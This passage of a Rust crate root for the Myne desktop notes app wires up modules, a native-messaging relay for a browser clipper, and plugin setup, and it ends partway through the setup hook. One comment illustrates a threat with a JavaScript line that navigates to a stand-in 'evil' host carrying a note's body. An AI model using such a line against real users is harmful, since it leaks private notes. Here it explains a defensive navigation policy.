// SPDX-License-Identifier: AGPL-3.0
pub use myne_core::atomic_write;
pub mod audio_rate;
mod auto_lock;
mod backup_container;
mod backup_schedule;
// The CLI terminal-access door (cli-thin-client task 3, MYND-490): a local
// socket bound to `cli_enabled` AND unlocked, torn down when either drops.
// See module docs for the full shape; `auto_lock::spawn_idle_lock_timer`
// below is untouched by this feature by design.
mod cli_bridge;
// `clipper` — the keyless browser↔desktop native-messaging host (TB10,
// `ext-foundation-handoff`). An EXTERNAL stdio ingress NOT governed by the
// Tauri capability ACL (TB6); it carries its own untrusted-input
// discipline (size caps / UTF-8 / no path traversal / MIME re-sniff / rate
// limit / silent-to-unpaired). Host mode is selected by the
// `--native-messaging-host` argv flag and runs a thin stdio loop INSTEAD
// of the WebView (`run_native_messaging_host_if_requested` below, called
// from `main.rs` before the Tauri app builds).
mod clipper;
#[cfg(windows)]
mod win_pipe;
// The shared export-naming vocabulary (filename sanitization, `" (1)"` suffix
// dedup, the §6 sanctioned embed/HTML rewrite) moved to `myne-core` (shared with
// mobile). Re-exported so existing `crate::export_naming::…` paths keep resolving
// (desktop notes export + the export plugin core reach in through it).
pub use myne_core::export_naming;
// Desktop wiring of `myne_core::hooks::VaultLifecycleHooks` — the lifecycle
// side-effects the shared command cores trigger (search/spell/attachments/
// pdf/workspace/screen-capture/sync) that do not live in `myne-core`.
// The Windows half of the device signing key's storage ladder
// (`decisions/protocol/0733` decision 4, rung 2 on Windows; myne-md/myne#938 task
// 10): DPAPI, user-scoped, over the `DeviceKeyProvider` seam. A no-op off Windows,
// where `core`'s Apple and Linux arms already answer.
mod device_key;
#[cfg(windows)]
mod device_key_dpapi;
mod hooks;
// myne-md/myne#860: the diagnostic log's runtime. Installed in `Builder::setup`
// because the file layer needs an `AppHandle` to resolve the platform log
// directory, and that hook is the earliest one that has it.
mod logging;
/// The meeting-session menubar indicator (myne-md/myne#789).
mod tray;
pub use myne_core::io_failure_kind;
// App-global WebView navigation policy (myne#383). The CSP has no directive
// that governs a top-level navigation, so `location = "https://evil/?d=" +
// noteBody` is outside every policy this app can write there. This module is
// that missing directive; it registers no commands and so needs no ACL wiring.
mod navigation;
// App-global no-egress invariant + static CI gate (local-ai epic,
// ai-egress-guardrail MYND-407). NOT AI-scoped — the whole client must never
// gain a network egress path. The canonical lists + pure predicates and the
// gate that applies them to `tauri.conf.json` / `Cargo.toml` / the runtime
// dep-closure / `capabilities/*.json` are the `cargo test` battery in this
// module, so the module is test-only (`#[cfg(test)]`).
#[cfg(test)]
mod no_egress;
pub use myne_core::note_txn;
pub use myne_core::paths;
mod plugins;
pub use myne_core::protocol_error_kind;
mod screen_capture;
// The full-text search engine (MYS1) + its encrypted persistence/reconcile
// core moved to `myne-core` (shared, though only desktop wires the feed via the
// `search_upsert`/`hydrate` hooks — mobile's `NoopHooks` leaves it hollow). The
// desktop IO shell (`plugins::notes::search_sync`) + the `note_search` command
// stay here and reach the engine through this re-export, so every existing
// `crate::search::{SearchIndexState, InvertedIndex, MatchedIn, Document,
// SearchHit, persist::…}` path keeps resolving.
pub use myne_core::search;
// POSIX shell quoting for the two generators that write a `/bin/sh` script
// around a `current_exe()`-derived path — the CLI PATH shim and the clipper's
// native-messaging launcher. Shared for the reason `uds` is: it is the same
// security property in both, not two that happen to match (myne#381).
mod sh_quote;
// The snapshot on-disk storage layer + pure retention policy moved to
// `myne-core` (shared with the mobile client). Re-exported so existing
// `crate::snapshot_store::…` / `crate::snapshot_policy::…` paths keep resolving
// (mirrors the `myne_core::paths` re-export above).
pub use myne_core::{snapshot_policy, snapshot_store};
mod spell;
// Host-side lifecycle for the `myne-tor` arti sidecar (MYND-650). The ONLY
// place in this crate that starts a process with a network surface — and it
// starts it as a *separate* process, which is what keeps arti out of
// `myne-desktop`'s linked dependency closure and leaves the `no_egress` gate
// scanning a tree with no networked crate in it.
mod tor_sidecar;
// Shared Unix-domain-socket bind (owner-only 0600, TOCTOU-closed), used by
// both local ingresses: `clipper::relay` and `cli_bridge::socket`.
mod uds;
// The desktop self-update domain model (the channel, the check status, the
// closed failure set). Desktop-only by design: `tauri-plugin-updater` exists on
// Linux/Windows/macOS and not on mobile, and `myne-core` compiles for wasm32 and
// mobile where an update type would be a false affordance. Signature
// verification and the anti-rollback version gate are the plugin's, never
// reimplemented here. Consumed by `plugins::update`.
mod update;
#[cfg(test)]
pub use myne_core::test_support;
pub use myne_core::text;
pub use myne_core::vault_id;
pub use myne_core::vault_meta_hash;
// SAFETY-CRITICAL eager boot migration `vault/` → `vaults/<id>/` (MYND-202
// task 4). Runs once at boot, before any routing, from the `setup` hook
// below — so every downstream probe/resolver sees only the post-migration
// layout. Idempotent: a no-op when no legacy `vault/` is present.
mod vault_migration;
// Discovery + best-effort registry cache. `discover_vaults` +
// `load_or_rebuild_registry` are now live via the `vault_list` IPC command
// (`plugins::vault_unlock::commands::vault_list_from_base`). The remaining
// not-yet-wired helper (`mint_unique_vault_id`, consumed by sub-feature 3's
// create path) carries its own per-item `#[cfg_attr(not(test), allow(dead_code))]`.
pub use myne_core::vault_registry;
pub use myne_core::vault_sweep;

/// Host-mode entry: if the process was launched by a browser with the
/// `--native-messaging-host` flag, run the keyless native-messaging stdio
/// loop and return `true` (the caller then exits WITHOUT building the
/// Tauri WebView). Otherwise return `false` and the normal app launch
/// proceeds.
///
/// This is the desktop side of the browser↔desktop clip channel (TB10).
/// The loop is deliberately thin — per-message processing
/// (framing + validation + caps + rate limit + silent-to-unpaired) lives
/// in [`clipper::host`]; this function only selects host mode and drives
/// the loop over the real stdin/stdout.
///
/// Task-6 scope (the tracer bullet): the host process is now a **thin,
/// untrusted relay**. It does NOT validate, compose, or write — it forwards
/// each ext→host frame over the local IPC socket to the running app (the
/// key-holder) and relays the app's reply back to stdout. The app
/// re-validates every forwarded frame as untrusted input
/// ([`clipper::ingest`]) before any write.
///
/// ## The relay mechanism + its security properties
///
/// - **Single-app-instance** is the already-vendored
///   `tauri-plugin-single-instance` (registered in [`run`], MYND-22): exactly
///   one app process owns the vault, so there is exactly one relay listener.
/// - **The local IPC channel** is a **Unix domain socket** under the app-data
///   dir (`<app_data_dir>/clipper.sock`) with **owner-only (0600)** perms —
///   NOT a TCP port. It is local-only (unreachable from the network) and
///   owner-only (a different OS user cannot connect). On a platform without a
///   Unix socket (Windows) the host has no relay target and exits cleanly (the
///   extension then sees "open Myne to clip" — task 8); the named-pipe arm is
///   a documented seam (see [`clipper::relay`]).
/// - **The app re-validates every forwarded frame as UNTRUSTED input** — the
///   host relaying a frame is NOT evidence it was authorized. The app
///   re-decodes the envelope, re-checks the token against the REAL registry,
///   re-enforces the caps + rate limit, then composes the note and calls the
///   EXISTING `note_create`. A frame that does not validate app-side is
///   silently ignored.
///
/// If the socket is unreachable (the desktop app is not running), the host
/// exits cleanly — the extension's honest "open Myne to clip" failure (task 8)
/// is driven by the absent reply, never a fake success.
#[cfg(desktop)]
pub fn run_native_messaging_host_if_requested() -> bool {
    if !clipper::host::is_host_mode(std::env::args().skip(1)) {
        return false;
    }
    #[cfg(any(unix, windows))]
    run_host_relay();
    true
}

/// Run the host loop with no argv check, for the dedicated Windows launcher.
///
/// The browser passes no arguments, so `run_native_messaging_host_if_requested`
/// answers `false` there; `myne-clipper-host` exists to be launched exactly that
/// way and calls this instead. Everything it can do is what the desktop binary
/// does when launched with the flag: the function contains no protocol of its
/// own.
#[cfg(desktop)]
pub fn run_native_messaging_host() {
    run_host_relay();
}

/// The Windows host-mode relay pump: connect to the running app's clipper pipe
/// and forward stdin/stdout frames over it.
///
/// Same shape as the Unix arm, against a named pipe instead of `clipper.sock`.
/// The app side needs two mutable views of one duplex handle, which
/// [`crate::win_pipe::PipeReader`] and [`crate::win_pipe::PipeWriter`] provide
/// without duplicating it; the [`crate::win_pipe::Client`] owns and closes it.
///
/// A connect failure ends cleanly, like Unix: the host writes nothing and exits,
/// and the extension surfaces its honest "open Myne to clip" state.
#[cfg(all(desktop, windows))]
fn run_host_relay() {
    let Some(app_data_dir) = host_mode_app_data_dir() else {
        return;
    };
    let name = clipper::relay_app::clipper_pipe_name(&app_data_dir);
    let Ok(connection) = crate::win_pipe::Client::connect(&name) else {
        return;
    };
    let mut app_reader = crate::win_pipe::PipeReader(connection.raw());
    let mut app_writer = crate::win_pipe::PipeWriter(connection.raw());
    let stdin = std::io::stdin();
    let stdout = std::io::stdout();
    let mut host_reader = stdin.lock();
    let mut host_writer = stdout.lock();
    let _ = clipper::relay::forward_stdio_over_socket(
        &mut host_reader,
        &mut host_writer,
        &mut app_reader,
        &mut app_writer,
    );
}

/// `<app_data_dir>` in host mode on Windows: Tauri resolves
/// `%APPDATA%\<identifier>` there, and the host process has no `AppHandle`, so
/// the same convention is applied by hand.
#[cfg(all(desktop, windows))]
fn host_mode_app_data_dir() -> Option<std::path::PathBuf> {
    const BUNDLE_ID: &str = "md.myne.desktop";
    let appdata = std::env::var_os("APPDATA")?;
    Some(std::path::PathBuf::from(appdata).join(BUNDLE_ID))
}

/// The Unix host-mode relay pump: connect to the running app's local IPC
/// socket and forward stdin↔stdout frames over it. Resolving the app-data dir
/// in host mode uses the SAME app identity the running app uses, so both
/// processes agree on the socket path without an out-of-band rendezvous.
///
/// A connect failure (app not running / socket absent) ends cleanly: the host
/// writes nothing and exits, and the extension surfaces the honest
/// host-unreachable state (task 8).
#[cfg(all(desktop, unix))]
fn run_host_relay() {
    // Resolve the app-data dir from the bundle identifier the SAME way the
    // running app does. `tauri::generate_context!` is only available inside
    // `run`; in host mode we resolve via the platform dirs using the bundle id
    // from the Tauri config at compile time.
    let Some(app_data_dir) = host_mode_app_data_dir() else {
        return;
    };
    let socket = clipper::relay::socket_path(&app_data_dir);
    let Ok(app_stream) = std::os::unix::net::UnixStream::connect(&socket) else {
        // App not running (no listener) → exit cleanly; the extension shows the
        // honest "open Myne to clip" state (task 8). No fake success.
        return;
    };
    let mut app_writer = app_stream;
    let Ok(mut app_reader) = app_writer.try_clone() else {
        return;
    };
    // Bound the wait for the app's reply (X2): a silently-ignored
    // unpaired/invalid/revoked frame gets neither a reply nor a close, so an
    // unbounded read would hang the host forever. The timeout exceeds the app's
    // dispatch budget, so a legitimate clip still receives its reply.
    let _ = app_reader.set_read_timeout(Some(clipper::relay::HOST_APP_REPLY_TIMEOUT));
    let stdin = std::io::stdin();
    let stdout = std::io::stdout();
    let mut host_reader = stdin.lock();
    let mut host_writer = stdout.lock();
    let _ = clipper::relay::forward_stdio_over_socket(
        &mut host_reader,
        &mut host_writer,
        &mut app_reader,
        &mut app_writer,
    );
}

/// Resolve `<app_data_dir>` in host mode (no `AppHandle` yet).
///
/// The bundle identifier is `md.myne.desktop` (`tauri.conf.json`); the
/// per-platform app-data dir is derived with the same convention Tauri uses so
/// the host and the running app resolve the SAME `clipper.sock` path. Uses
/// `dirs`-free std env probing to avoid a new dependency.
#[cfg(all(desktop, unix))]
fn host_mode_app_data_dir() -> Option<std::path::PathBuf> {
    const BUNDLE_ID: &str = "md.myne.desktop";
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var_os("HOME")?;
        Some(
            std::path::PathBuf::from(home)
                .join("Library")
                .join("Application Support")
                .join(BUNDLE_ID),
        )
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        // XDG: $XDG_DATA_HOME or ~/.local/share, then the bundle id.
        if let Some(xdg) = std::env::var_os("XDG_DATA_HOME") {
            if !xdg.is_empty() {
                return Some(std::path::PathBuf::from(xdg).join(BUNDLE_ID));
            }
        }
        let home = std::env::var_os("HOME")?;
        Some(
            std::path::PathBuf::from(home)
                .join(".local")
                .join("share")
                .join(BUNDLE_ID),
        )
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    // The subscriber is installed in `Builder::setup` (see `crate::logging`),
    // not here, because the FILE layer needs an `AppHandle` to resolve the
    // platform log directory. That hook is the earliest one holding it, and it
    // still runs before the WebView exists.
    //
    // What moved with it, and why the shape changed: the install used to be a
    // single `fmt()` with an `EnvFilter`, which could only ever write to stdout.
    // It is now a `registry` with two layers, so stdout keeps honouring
    // `RUST_LOG` (a developer's console knob) while the file layer carries its
    // own fixed `info` floor and ignores `RUST_LOG` entirely (an environment
    // variable must not decide what persists on a user's disk; myne-md/myne#860).

    let builder = tauri::Builder::default();

    // Desktop-only: register `tauri-plugin-single-instance` FIRST so a
    // second launch is intercepted before any other plugin initializes
    // and is redirected to focus the existing window. Closes the
    // parallel-instance race source at process boundary; the slot-held
    // `vault_meta_bytes_hash` CAS in MYND-22 is the defensive second
    // layer. See `decisions.md` 2026-05-06 entry.
    #[cfg(desktop)]
    let builder = builder.plugin(tauri_plugin_single_instance::init(|app, args, _cwd| {
        // MYND-567: on Windows + Linux the OS delivers a `myne://` deep link by
        // spawning a SECOND process whose only argv is the URL — so the
        // single-instance callback is the deep link's arrival path there. Hand
        // the argv to the deep-link plugin BEFORE raising the window: it
        // re-parses them, matches the scheme against the `tauri.conf.json`
        // allowlist (`myne` only), and emits `deep-link://new-url` for the
        // WebView latch to pick up. A no-op on macOS (the plugin routes
        // `RunEvent::Opened` instead) and a no-op for an ordinary second
        // launch with no URL argv.
        //
        // The URL is NOT trusted here — this only transports it. Parsing,
        // caps, and the confirmation gate live WebView-side
        // (`src/lib/themeDeepLink.ts`), and the palette still has to clear the
        // `theme_validator` allowlist inside `themes_import` before any write.
        {
            use tauri_plugin_deep_link::DeepLinkExt;
            app.deep_link().handle_cli_arguments(args.iter());
        }
        // myne-md/myne#788: a second launch is also how Windows/Linux delivers
        // a file association ("Open with Myne" on a `.md`). Ingested after the
        // deep-link handoff: a `myne://` URL never survives the candidate
        // filter (it is not a file path), so the order is about the window
        // being raised, not about shadowing.
        plugins::plain_file::ingest::ingest_args(app, args.clone());
        // The `show()` inside is load-bearing, not redundant with
        // `unminimize()`: auto-lock on idle calls `window.hide()` (orderOut on
        // macOS), which leaves the window HIDDEN rather than minimized.
        // `unminimize()` is a no-op on a hidden window, so without `show()` the
        // window stays invisible after a re-launch. See `auto_lock::hide_window`.
        //
        // myne-md/myne#482: the second launch may be the ESCAPE. The recovery
        // path the flag is documented for is "the app is already running,
        // showing a black window, and the user reaches for a terminal". And a
        // second launch exits into this callback, so without reading argv here
        // the flag silently does nothing in the one situation it is advertised
        // for. Folded in BEFORE the re-show, so the window that comes back is
        // already resolved against it.
        use tauri::Manager as _;
        if let Some(state) = app.try_state::<screen_capture::ScreenCaptureState>() {
            // `flag_in_delivered_argv`, not `flag_in`: this same `args` vector
            // is the `myne://` deep-link payload twelve lines above, and that
            // ingress is reachable by any website. See the function's own doc.
            if screen_capture::flag_in_delivered_argv(args.iter().skip(1)) {
                state.note_flag_relaunch();
                tracing::info!(event = "screen_capture_override_flag_relaunch");
            }
        }
        // myne-md/myne#483: that hide/show cycle is also where the Windows
        // capture affinity is reported to be lost, so the re-show and the
        // re-apply are one call rather than two things to remember.
        screen_capture::show_protected(app, "single_instance_show");
    }));

    let builder = builder
        // myne#383: the app-global navigation policy, registered FIRST so the
        // rule about what may load precedes every plugin that can cause a load.
        // Order is functionally irrelevant — the plugin store is read at
        // navigation time and fans out AND-style — but this is the one hook
        // that reaches the config-declared `main` window, and it reads as the
        // gate it is where it sits.
        .plugin(navigation::init())
        // MYND-567: `myne://` custom-URL-scheme delivery. COLD START needs no
        // wiring of ours — the plugin's own `init` already feeds `std::env::args()`
        // to `handle_cli_arguments` on desktop, which is what makes the WebView's
        // boot-time `getCurrent()` see a URL the OS launched us with. Do not add a
        // second call in `setup`: it is redundant, and reading argv ourselves would
        // put a `std::env::args()` panic-on-non-UTF-8 on the boot path. Registration
        // itself is bundle-time
        // from `tauri.conf.json` `plugins.deep-link.desktop.schemes`
        // (macOS `CFBundleURLTypes`, Windows NSIS registry, Linux `.desktop`
        // MimeType), so the scheme belongs to the INSTALLED app on all three
        // platforms. The plugin grants no network capability — it only carries
        // a URL the OS already resolved to us. Scheme grammar is shared with
        // the mobile client (`myne://open` / `myne://capture`); desktop owns
        // `myne://theme/install`.
        .plugin(tauri_plugin_deep_link::init())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_clipboard_manager::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        // Desktop self-update. The ONE registered plugin that carries an HTTP
        // client (`reqwest`); it is reached only from host-side Rust (the
        // `update` plugin's commands), never granted to the WebView. Its
        // signature check cannot be disabled. See `src-tauri/src/update/`,
        // `src-tauri/src/no_egress.rs` and `docs/dependency-policy.md`.
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(plugins::update::init())
        .plugin(plugins::backup::init())
        .plugin(plugins::export::init())
        .plugin(plugins::secret_export::init())
        .plugin(plugins::vault_creation::init())
        .plugin(plugins::vault_unlock::init())
        .plugin(plugins::vault_recover::init())
        .plugin(plugins::vault_change_password::init())
        .plugin(plugins::vault_delete::init())
        .plugin(plugins::vault_repair::init())
        .plugin(plugins::prefs::init())
        .plugin(plugins::themes::init())
        .plugin(plugins::member_names::init())
        .plugin(plugins::device_binding::init())
        // external-mcp-connection (myne-md/myne#923): the two read-only
        // commands behind Settings > AI > External access. Registered
        // unconditionally; the section that calls them renders only where the
        // `externalMcp` capability exists, which is desktop only.
        .plugin(plugins::mcp::init())
        .plugin(plugins::notes::init())
        .plugin(plugins::snapshots::init())
        .plugin(plugins::sync::init())
        .plugin(plugins::vault_indices::init())
        .plugin(plugins::quick_unlock::init())
        .plugin(plugins::attachments::init())
        .plugin(plugins::importer::init())
        .plugin(plugins::graph_layout::init())
        // live-collab (`collab-editor-bridge`): the live co-editing session
        // commands. The `LiveSessionRegistry` state is managed in the setup hook
        // below, beside the awareness signal.
        .plugin(plugins::live::init())
        .plugin(plugins::chats::init())
        // myne-md/myne#697: the agent-memory + personality store. Same
        // unlocked-slot gating as chats; the `ai_enabled` pref is the
        // runtime gate, re-read per command host-side.
        .plugin(plugins::memory::init())
        // myne#411: the device-local hide-vault-names option. Registered
        // unconditionally and reachable pre-unlock, because the picker it
        // governs is the screen that renders before any vault is open.
        .plugin(plugins::vault_label::init())
        // myne#684: the device-local account record (the account/vault split).
        // Registered unconditionally and reachable pre-unlock, because the
        // picker it governs is the screen that renders before any vault is open.
        .plugin(plugins::account::init())
        // myne#482 + #483: the device-local screen-capture escape hatch and
        // the WebView-side re-assert. Registered unconditionally and
        // reachable pre-unlock, because the pre-unlock set is exactly what a
        // locked-out user cannot see.
        .plugin(plugins::screen_capture::init())
        // myne-md/myne#788: the device-local gate for the plain-file editor.
        // Readable in every vault state by construction (its own file, not a
        // vault.prefs field), which is the whole reason it exists.
        .plugin(plugins::plain_file::init())
        // myne-md/myne#860: the device-local diagnostic-log switch (and, in
        // later tasks of the same feature, the log state read, the crash
        // record, the reveal action and the report bundle).
        .plugin(plugins::diagnostics::init())
        .plugin(plugins::workspace::init())
        .plugin(plugins::pdf_export::init())
        .plugin(plugins::detached_window::init())
        // ext-foundation-handoff task 4: the browser-extension pairing
        // dialog's narrow Accept/Reject IPC surface (TB6-governed; the
        // stdio host is the separate, ACL-exempt ingress). Manages the
        // PairingState singleton (pending session + in-memory token
        // registry; task 7 persists it).
        .plugin(plugins::clipper_pairing::init())
        // cli-thin-client task 12 (MYND-490): the CLI door's Settings block
        // reads one read-only command from here — the RAM-only last-access age
        // and whether `myne` is on the user's PATH. Everything about the door
        // that IS a preference goes through `prefs` instead.
        .plugin(cli_bridge::plugin::init())
        // MYND-262: offline spell-check engine (spellbook). Binds spell_check +
        // add/ignore commands; SpellState is managed in setup below.
        .plugin(spell::init())
        // MYND-169: the `attachment://<id>` async custom-URI-scheme
        // handler — decrypts a `MYA1` blob in memory, re-sniffs the
        // content-type from the decrypted bytes, and serves ONLY an
        // allowlisted type (never text/html). Unlock-gated +
        // main-window-scoped inside the handler. Registered on the
        // Builder (not as a plugin invoke handler — custom protocols are
        // a builder-level concern). See `plugins::attachments::scheme`.
        .register_asynchronous_uri_scheme_protocol(
            plugins::attachments::scheme::SCHEME,
            plugins::attachments::scheme::handle,
        )
        // Sync focus trigger: regaining OS window focus arms a rate-limited
        // immediate poll in the background sync loop (the scheduler enforces
        // the FOCUS_POLL_FLOOR_MS floor, so alt-tab flapping cannot turn this
        // into a polling channel). Host-side WindowEvent — deliberately not a
        // WebView `visibilitychange` (which does not flip on desktop focus
        // loss) and not a new IPC command (no ACL surface widening).
        .on_window_event(|window, event| {
            if let tauri::WindowEvent::Focused(true) = event {
                use tauri::Manager;
                if let Some(sig) = window
                    .app_handle()
                    .try_state::<plugins::sync::loop_control::SyncFocusSignal>()
                {
                    sig.bump();
                }
            }
        });

    // local-ai epic (MYND-406): register the on-device inference plugin ONLY
    // when the default-off `local-inference` cargo feature is enabled, so the
    // default auditable binary carries zero AI symbols and no `local-inference`
    // command (SYNC-5). The `Engine` trait + stub live behind the same gate.
    #[cfg(feature = "local-inference")]
    let builder = builder.plugin(plugins::local_inference::init());

    // myne#529: agentic note editing. The loop and every policy live in
    // `myne-core`; this plugin registers the run table, the host session table
    // (the transcript) and the eight IPC commands. Registered beside
    // `local-inference` and under the same gate, because its adapter binds to
    // that plugin's engine: see the comment on `plugins::agent`.
    #[cfg(feature = "local-inference")]
    let builder = builder.plugin(plugins::agent::init());

    builder
        .setup(|app| {
            use tauri::Manager;

            // myne-md/myne#860: install the one subscriber, and manage the file
            // sink so the toggle command can flip it without a restart. Runs
            // first, before the boot migration below, so the migration's own
            // events are captured when logging is on. A failure leaves stdout
            // only and does not stop the app: logging is a diagnostic aid.
            //
            // The `enabled` it reads comes from the device-local
            // `diagnostic-log.json`, read here rather than after unlock, which is
            // the whole reason that flag is a plaintext file.
            let handle = app.handle().clone();
            if let Ok(sink) = crate::logging::init(&handle) {
                let _ = app.manage(sink);
            }
            // On `Err`, `init` has already installed a stdout-only subscriber
            // and warned on the same path.
            // MYND-202: SAFETY-CRITICAL eager boot migration `vault/` →
            // `vaults/<id>/`, run FIRST — before screen-capture init, before
            // any timer/state setup, and (by virtue of `setup` running during
            // `build()`) before the WebView/router is exposed or any vault
            // command can be invoked. The rest of the app therefore only ever
            // observes the post-migration layout (one on-disk invariant).
            //
            // Copy → fsync → verify-new → delete-old-LAST; the old `vault/` is
            // the untouched source of truth until the final delete, so an
            // interrupt at any step leaves it intact and the next boot
            // re-runs. A migration failure is logged with a closed-enum
            // reduction (paths + VaultId are DENY-listed) and is NON-FATAL:
            // the old `vault/` is left intact for the next boot to retry, so
            // the app still starts (the transitional resolver falls back to
            // the legacy `vault/` until a later boot completes the move).
            match app.path().app_data_dir() {
                Ok(base) => {
                    match vault_migration::migrate_legacy_vault(&base) {
                        Ok(_) => {}
                        Err(e) => {
                            let kind = vault_migration::migration_failure_kind(&e);
                            tracing::error!(
                                stage = "vault_migration_failed",
                                io_failure_kind = ?kind,
                                "boot migration failed; old vault/ left intact for next-boot retry"
                            );
                        }
                    }
                    // MYND-253 self-heal: prune file-free `vaults/<id>/`
                    // leftovers (an interrupted create, or the empty dir the
                    // pre-fix migration stranded) so discovery does not flag
                    // them `Corrupted` forever. rmdir-only — structurally
                    // incapable of deleting data — and deliberately HERE,
                    // not in discovery: read paths stay side-effect-free.
                    vault_registry::sweep_empty_vault_dirs(&base);
                }
                Err(_) => {
                    tracing::error!(
                        stage = "vault_migration_app_data_dir",
                        "could not resolve app_data_dir for boot migration; skipping"
                    );
                }
            }
            // myne-md/myne#482: resolve the device-local escape hatch BEFORE
            // the first frame, and manage it before anything can call
            // `screen_capture::apply`. Both orderings are load-bearing:
            // resolving late would paint one protected frame at a user who
            // cannot see through it, and managing late would let an early
            // `apply` run unresolved and warn about its own wiring.
            app.manage(screen_capture::override_at_startup(app));
            // Apply screen-capture protection before `window.show()` so
            // the first frame is protected on macOS + Windows 10 build
            // 19041+. The main window is declared `"visible": false` in
            // `tauri.conf.json` so this is the only `show()` call.
            screen_capture::init(app)?;
            // myne-md/myne#788: File → Open File… (⌘O), the discoverable entry
            // point for the plain-file editor. The in-surface Open button
            // renders only once a file is ALREADY open (`PlainFileScreen`
            // mounts on `files.length > 0`), so without this menu item a
            // running app has no way to open the first file. Built by
            // extending Tauri's platform default menu (the app/Edit/View/
            // Window/Help submenus stay), host-side in Rust, so the capability
            // set gains no `core:menu` grant. The handler is silent on a
            // gate-off device and on a cancelled picker, matching the OS
            // ingresses; the dialog command carries the typed refusal for the
            // in-app caller.
            {
                use tauri::menu::{Menu, MenuItem, MenuItemKind, PredefinedMenuItem, Submenu};
                let menu = Menu::default(app.handle())?;
                let open_item = MenuItem::with_id(
                    app.handle(),
                    plugins::plain_file::OPEN_FILE_MENU_ID,
                    "Open File…",
                    true,
                    Some("CmdOrCtrl+O"),
                )?;
                // The platform default carries a File submenu on macOS and
                // Windows but not on Linux/BSD, so create one when it is
                // absent rather than dropping the item.
                let mut file_submenu = None;
                for item in menu.items()? {
                    if let MenuItemKind::Submenu(sub) = item {
                        if sub.text().map(|t| t == "File").unwrap_or(false) {
                            file_submenu = Some(sub);
                            break;
                        }
                    }
                }
                let file = match file_submenu {
                    Some(sub) => sub,
                    None => {
                        let sub = Submenu::with_id(app.handle(), "file-menu", "File", true)?;
                        menu.prepend(&sub)?;
                        sub
                    }
                };
                file.prepend(&PredefinedMenuItem::separator(app.handle())?)?;
                file.prepend(&open_item)?;
                app.set_menu(menu)?;
                app.on_menu_event(|handle, event| {
                    if event.id() == plugins::plain_file::OPEN_FILE_MENU_ID {
                        let handle = handle.clone();
                        tauri::async_runtime::spawn(async move {
                            let _ = plugins::plain_file::commands::open_dialog(handle).await;
                        });
                    }
                });
            }
            // MYND-121: start the authoritative, fail-closed idle-lock timer.
            // Runs for the process lifetime; no-op until a vault is Unlocked.
            auto_lock::spawn_idle_lock_timer(app.handle().clone());
            // cli-thin-client task 12: the CLI door's last-access marker.
            // Managed BEFORE the supervisor is spawned (below) so the socket
            // side and the `cli-bridge` command read one instance. Managed
            // unconditionally, not under `#[cfg(unix)]`, because the command
            // is registered on every platform and a `State` with nothing
            // behind it fails the invoke rather than answering "never used".
            app.manage(cli_bridge::activity::SharedLastAccess::default());
            // cli-thin-client task 3 (MYND-490): the CLI terminal-access
            // door's lifecycle supervisor. Runs for the process lifetime;
            // the command socket it manages exists only while `cli_enabled`
            // is true AND the vault is Unlocked. Unix-only today, matching
            // `clipper::relay_app::spawn_relay_listener`'s existing posture.
            #[cfg(unix)]
            cli_bridge::spawn_lifecycle_supervisor(app.handle().clone());
            // cli-thin-client task 11: put the bundled `myne` sidecar on the
            // user's PATH via a `~/.local/bin` launcher. Idempotent,
            // best-effort and non-fatal (the clipper wrapper's discipline),
            // and NOT gated on `cli_enabled`: the CLI's "access is disabled,
            // enable it in Settings" refusal is only readable if the command
            // exists. Never clobbers a command we did not write — and the same
            // reconcile installs `myne-mcp` (external-mcp-connection task 1),
            // each with its own ownership marker.
            cli_bridge::path_shim::reconcile();
            // Shared command-core lifecycle hooks (myne-core). The desktop
            // impl captures the AppHandle and delegates to the desktop-only
            // modules below; must be managed before any command taking
            // `State<'_, Hooks>` runs. The concrete state singletons the hooks
            // reach via `try_state` (SearchIndexState/SyncLocalChange/…) are
            // still managed individually below.
            let hooks: myne_core::hooks::Hooks =
                std::sync::Arc::new(hooks::DesktopHooks::new(app.handle().clone()));
            app.manage(hooks);
            // myne-md/myne#938 task 10: hand `myne-core` the Windows DPAPI store, so a
            // Windows install keeps a device signing key instead of needing the phrase
            // to sync. Installed before any command can run, and only ever once per
            // process: a second provider would be a second device key, and the
            // device's binding follows one key. A no-op off Windows.
            device_key::install(app.handle());
            // MYND-29: app-level live in-RAM search-index state, updated
            // incrementally by the notes lifecycle (create/update/delete) and
            // queried by the search command; cleared on lock (Task 8).
            app.manage(search::SearchIndexState::default());
            // MYND-262/266: app-level live spell engine + personal/ignore sets.
            // Dictionaries loaded + personal/ignore hydrated on unlock
            // (spell::sync::hydrate_spell), wiped on lock (zeroize_spell) —
            // twin of SearchIndexState's residency discipline.
            app.manage(spell::state::SpellState::default());
            // MYND-31: app-level live in-RAM VaultIndices state (wikilink
            // graph + backlinks + tag index), rebuilt on unlock by the
            // TS-orchestrated sweep and wiped on lock alongside the search
            // index. Twin of SearchIndexState above.
            app.manage(plugins::vault_indices::VaultIndicesState::default());
            // MYND-169: app-level live in-RAM attachment reference graph
            // (note → attachment-ids), the structural twin of
            // VaultIndicesState above. Rebuilt on unlock by the
            // TS-orchestrated note sweep (TODO(attachments reconcile) — see
            // `plugins::attachments::reconcile`) and wiped on lock alongside
            // the search index + VaultIndices.
            app.manage(plugins::attachments::AttachmentRefsState::default());
            // MYND-259: voice-notes active-recording session singleton (holds
            // at most one in-progress mic capture; only Send control handles —
            // the cpal stream lives inside the capture thread).
            app.manage(plugins::attachments::VoiceRecordState::default());
            // The meeting-session singleton (myne-md/myne#789), managed beside
            // the voice one because the two share a capture path and must
            // exclude each other.
            app.manage(plugins::attachments::MeetingSessionState::default());
            // MYND-29 Task 7: periodic best-effort flush of the search index
            // to its encrypted `vault.search` blob while a vault is Unlocked
            // (no-op while locked). Bounds how much a hard quit / crash loses
            // to one flush interval; the next unlock reconciles the delta.
            // Managed state above must exist first (the timer reads it).
            plugins::notes::search_sync::spawn_periodic_flush_timer(app.handle().clone());
            // MYND-650 task 2: the arti sidecar supervisor and the routing gate
            // it publishes into. Managed as a pair so the transport (tasks 3/4)
            // reads the gate without knowing the supervisor exists. The
            // `RunEvent` arm below is the app-quit teardown.
            //
            // This block sits BEFORE the sync loop deliberately (task 6): the
            // gate must be installed, and the device-local toggle restored,
            // before anything can build a transport. A transport constructed
            // first would read back a default gate and dial directly on a
            // device whose user turned Tor on — a fail-open in the one window
            // nobody would think to look at.
